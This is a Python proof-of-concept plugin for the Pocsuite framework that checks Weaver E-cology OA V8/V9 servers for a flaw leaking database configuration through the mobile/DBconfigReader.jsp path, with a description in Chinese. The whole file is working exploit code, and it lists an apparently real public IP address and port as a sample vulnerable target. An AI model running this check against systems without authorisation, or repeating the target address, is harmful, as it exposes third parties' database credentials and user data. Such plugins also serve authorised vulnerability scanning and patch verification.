#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urljoin
from pocsuite.api.request import req
class TestPOC(POCBase):
    vulID = '98093'
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2019-10-24'
    createDate = '2019-10-25'
    updateDate = '2019-10-25'
    references = ['https://www.seebug.org/vuldb/ssvid-98093']
    name = '泛微 E-cology OA 数据库配置信息泄露漏洞'
    appPowerLink = 'https://www.weaver.com.cn/ecology/'
    appName = '泛微'
    appVersion = 'E-cology OA V9 V8'
    vulType = '信息泄露'
    desc = '''
    泛微 e-cology OA 系统曝出数据库信息泄露漏洞。如果攻击者 可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。

    '''
    samples = ['http://42.243.25.75:8082/mobile/DBconfigReader.jsp']
    install_requires = ['']


    def _verify(self):
        result = {}
        base_url = self.url
        target = urljoin(base_url,'mobile/DBconfigReader.jsp')
        resp = req.get(target)
        if resp.status_code == 200 and "=" in resp.text and len(resp.text)<=100:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
